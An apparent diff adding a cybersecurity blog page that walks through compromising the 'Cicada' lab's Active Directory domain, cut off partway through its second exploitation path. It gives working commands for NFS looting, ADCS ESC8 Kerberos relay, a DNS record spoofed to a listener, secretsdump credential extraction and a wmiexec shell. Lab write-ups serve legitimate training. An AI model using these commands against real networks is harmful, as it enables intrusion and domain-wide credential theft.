@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Cicada Domain Compromise WriteupInitial ReconnaissanceStarting with a port scan to identify available services: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Cicada">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/03/30/VL-Cicada/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Cicada Domain Compromise WriteupInitial ReconnaissanceStarting with a port scan to identify available services: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/png_pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/smb_enum.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/smb_ldap_access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/vulnerable.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/machineaccountquota.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/install_openvpn.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/dns_ip.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/dc_ip.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/pc_rename.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/changing_domain.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/cicada_share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/compile.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cicada/getting-pfx.png">
+<meta property="article:published_time" content="2025-03-30T15:35:58.000Z">
+<meta property="article:modified_time" content="2025-03-30T12:36:47.057Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Cicada/png_pass.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Cicada</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/28/VL-Hybrid/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/30/VL-Cicada/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&text=VL-Cicada"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&is_video=false&description=VL-Cicada"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Cicada&body=Check out this article: https://panosoikogr.github.io/2025/03/30/VL-Cicada/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&name=VL-Cicada&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&t=VL-Cicada"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cicada-Domain-Compromise-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Cicada Domain Compromise Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">NFS Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-NFS"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via NFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Attempts"><span class="toc-number">1.4.</span> <span class="toc-text">Authentication Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.5.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Certificate-Services-ADCS-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">Active Directory Certificate Services (ADCS) Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Machine-Account-Quota-Check"><span class="toc-number">1.7.</span> <span class="toc-text">Machine Account Quota Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Path-1-Windows-VM-Approach"><span class="toc-number">1.8.</span> <span class="toc-text">Exploitation Path 1: Windows VM Approach</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-the-Windows-VM"><span class="toc-number">1.8.1.</span> <span class="toc-text">Setting Up the Windows VM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-and-Running-the-Exploit"><span class="toc-number">1.8.2.</span> <span class="toc-text">Building and Running the Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Path-2-Linux-Approach"><span class="toc-number">1.9.</span> <span class="toc-text">Exploitation Path 2: Linux Approach</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.10.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Cicada
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-30T15:35:58.000Z" class="dt-published" itemprop="datePublished">2025-03-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Cicada-Domain-Compromise-Writeup"><a href="#Cicada-Domain-Compromise-Writeup" class="headerlink" title="Cicada Domain Compromise Writeup"></a>Cicada Domain Compromise Writeup</h1><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Starting with a port scan to identify available services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 11:04:14Z)</span><br><span class="line">111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49503/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50006/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">62920/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p>The scan reveals we’re dealing with a Windows Active Directory environment (Domain: cicada.vl) with multiple services running, including NFS, which presents an interesting initial attack vector.</p>
+<h2 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h2><p>Checking for available NFS shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ showmount -e 10.10.107.186 </span><br><span class="line">Export list for 10.10.107.186:</span><br><span class="line">/profiles (everyone)        </span><br></pre></td></tr></table></figure>
+
+<p>Mounting the exposed NFS share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.107.186:/profiles /mnt/ -o nolock</span><br></pre></td></tr></table></figure>
+
+<p>After mounting, we discovered several potential usernames:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Administrator  </span><br><span class="line">Daniel.Marshall  </span><br><span class="line">Debra.Wright  </span><br><span class="line">Jane.Carter  </span><br><span class="line">Jordan.Francis  </span><br><span class="line">Joyce.Andrews  </span><br><span class="line">Katie.Ward  </span><br><span class="line">Megan.Simpson </span><br><span class="line">Richard.Gibbons  </span><br><span class="line">Rosie.Powell  </span><br><span class="line">Shirley.West</span><br></pre></td></tr></table></figure>
+
+<h2 id="Initial-Access-via-NFS"><a href="#Initial-Access-via-NFS" class="headerlink" title="Initial Access via NFS"></a>Initial Access via NFS</h2><p>Exploring Rosie Powell’s directory:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(panosoiko㉿kali)-[/mnt/Rosie.Powell]</span><br><span class="line">└─$ ls -la</span><br><span class="line">total 1797</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294    4096 Sep 15  2024 ..</span><br><span class="line">drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents</span><br><span class="line">-rwx------ 1 4294967294 4294967294 1832505 Sep 13  2024 marketing.png</span><br></pre></td></tr></table></figure>
+
+<p>The file permissions suggest we need to match the UID to access these files. Setting read permissions:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +r /mnt/Rosie.Powell/marketing.png</span><br></pre></td></tr></table></figure>
+
+<p>Opening the marketing.png file revealed credentials:</p>
+<p>Rosie.Powell : Cicada123</p>
+<p><img src="/images/Cicada/png_pass.png" alt="Password found in marketing.png"></p>
+<h2 id="Authentication-Attempts"><a href="#Authentication-Attempts" class="headerlink" title="Authentication Attempts"></a>Authentication Attempts</h2><p>When attempting to use these credentials over SMB, we encountered <code>STATUS_NOT_SUPPORTED</code>:</p>
+<p><img src="/images/Cicada/smb_enum.png" alt="SMB authentication failure"></p>
+<p>Instead, we’ll request a Kerberos TGT (Ticket Granting Ticket) and use Kerberos authentication:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Rosie.Powell:Cicada123</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Rosie.Powell.ccache</span><br></pre></td></tr></table></figure>
+
+<p>With Kerberos authentication, we now have access to LDAP and SMB:</p>
+<p><img src="/images/Cicada/smb_ldap_access.png" alt="Successful LDAP and SMB access"></p>
+<h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><p>Collecting Active Directory information with BloodHound:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache --bloodhound --dns-server 10.10.101.214 -c All --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p>No clear path to domain controller was initially visible in BloodHound.</p>
+<h2 id="Active-Directory-Certificate-Services-ADCS-Enumeration"><a href="#Active-Directory-Certificate-Services-ADCS-Enumeration" class="headerlink" title="Active Directory Certificate Services (ADCS) Enumeration"></a>Active Directory Certificate Services (ADCS) Enumeration</h2><p>Investigating certificate services for potential vulnerabilities:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -k -target DC-JPQ225.cicada.vl -dc-ip 10.10.101.214 -debug</span><br></pre></td></tr></table></figure>
+
+<p>Output revealed important certificate authority information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CA Name                             : cicada-DC-JPQ225-CA</span><br><span class="line">DNS Name                            : DC-JPQ225.cicada.vl</span><br><span class="line">Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl</span><br><span class="line">Certificate Serial Number           : 1538EE585D915EB645C3B10CF9747B7C</span><br><span class="line">Certificate Validity Start          : 2025-03-28 17:51:10+00:00</span><br><span class="line">Certificate Validity End            : 2525-03-28 18:01:10+00:00</span><br><span class="line">Web Enrollment                      : Enabled</span><br><span class="line">User Specified SAN                  : Disabled</span><br><span class="line">Request Disposition                 : Issue</span><br><span class="line">Enforce Encryption for Requests     : Enabled</span><br><span class="line">Permissions</span><br><span class="line">  Owner                             : CICADA.VL\Administrators</span><br><span class="line">  Access Rights</span><br><span class="line">    ManageCertificates              : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    ManageCa                        : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    Enroll                          : CICADA.VL\Authenticated Users</span><br><span class="line">[!] Vulnerabilities</span><br><span class="line">  ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br></pre></td></tr></table></figure>
+
+<p>Discovery of ESC8 vulnerability opens several potential attack paths. Checking for resource-based constrained delegation vulnerabilities:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb DC-JPQ225.cicada.vl -k --use-kcache -M coerce_plus</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cicada/vulnerable.png" alt="Vulnerable services"></p>
+<p>None of those attacks worked, but we identified a new approach using Kerberos Relay to exploit ESC8: <a target="_blank" rel="noopener" href="https://github.com/CICADA8-Research/RemoteKrbRelay">https://github.com/CICADA8-Research/RemoteKrbRelay</a></p>
+<h2 id="Machine-Account-Quota-Check"><a href="#Machine-Account-Quota-Check" class="headerlink" title="Machine Account Quota Check"></a>Machine Account Quota Check</h2><p>Verifying if we can add machine accounts to the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache -M maq</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cicada/machineaccountquota.png" alt="Machine Account Quota"></p>
+<p>With a machine account quota of 10, we can domain join our own Windows VM or use a TGT &amp; RPCSS TGS on a non-domain joined Windows machine.</p>
+<h2 id="Exploitation-Path-1-Windows-VM-Approach"><a href="#Exploitation-Path-1-Windows-VM-Approach" class="headerlink" title="Exploitation Path 1: Windows VM Approach"></a>Exploitation Path 1: Windows VM Approach</h2><h3 id="Setting-Up-the-Windows-VM"><a href="#Setting-Up-the-Windows-VM" class="headerlink" title="Setting Up the Windows VM"></a>Setting Up the Windows VM</h3><ol>
+<li><p>Install and configure OpenVPN on the Windows VM:<br><img src="/images/Cicada/install_openvpn.png" alt="OpenVPN installation"></p>
+</li>
+<li><p>Set the DNS IP to the domain controller:<br><img src="/images/Cicada/dns_ip.png" alt="Network settings"><br><img src="/images/Cicada/dc_ip.png" alt="DC IP configuration"></p>
+</li>
+<li><p>Rename the PC and join the domain:<br><img src="/images/Cicada/pc_rename.png" alt="PC rename"><br><img src="/images/Cicada/changing_domain.png" alt="Domain joining"><br><img src="/images/Cicada/cicada_share.png" alt="Cicada share access"></p>
+<p>Note: Windows 10 Pro or Windows Server is required for domain joining.</p>
+</li>
+</ol>
+<h3 id="Building-and-Running-the-Exploit"><a href="#Building-and-Running-the-Exploit" class="headerlink" title="Building and Running the Exploit"></a>Building and Running the Exploit</h3><ol>
+<li><p>Clone the RemoteKrbRelay repository and open the solution file in Visual Studio:<br><img src="/images/Cicada/compile.png" alt="Compiling the exploit"></p>
+</li>
+<li><p>Select Release, then x64, and build the solution. The executable will be in <code>[SolutionFolder]\[ProjectFolder]\bin\Release\</code></p>
+</li>
+<li><p>Run the following command to get a base64-encoded certificate (requires logging in as Rosie, starting VPN, then changing users):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3</span><br></pre></td></tr></table></figure>
+
+<p>Note: This approach may be blocked by firewalls preventing RPC access.</p>
+</li>
+<li><p>If successful, use the certificate to get a TGT:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gettgtpkinit.py -pfx-base64 $(cat ./cert.pkcs12) -dc-ip IP cicada.vl/&#x27;DC-JPQ225$&#x27; adm.ccache</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adm.ccache</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Extract secrets from the domain controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump cicada.vl/&#x27;DC-JPQ225$&#x27;@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Get a TGT for the admin and establish a shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/adminstrator@DC-JPQ225.cicada.vl -hashes</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adminstrator.ccache</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec cicada.vl/adminstrator@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="Exploitation-Path-2-Linux-Approach"><a href="#Exploitation-Path-2-Linux-Approach" class="headerlink" title="Exploitation Path 2: Linux Approach"></a>Exploitation Path 2: Linux Approach</h2><ol>
+<li><p>Add our machine to the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC-JPQ225.cicada.vl -u &#x27;rosie.powell&#x27; -p &#x27;Cicada123&#x27; -k -d &#x27;cicada.vl&#x27; add dnsRecord &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; 10.8.5.195</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Run krbrelayx to wait for a connection:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 krbrelayx.py -t &#x27;http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp&#x27; --adcs --template DomainController -v &#x27;DC-JPQ225$&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Trigger a connection back to us using dfscoerce to get the .pfx certificate:</p>
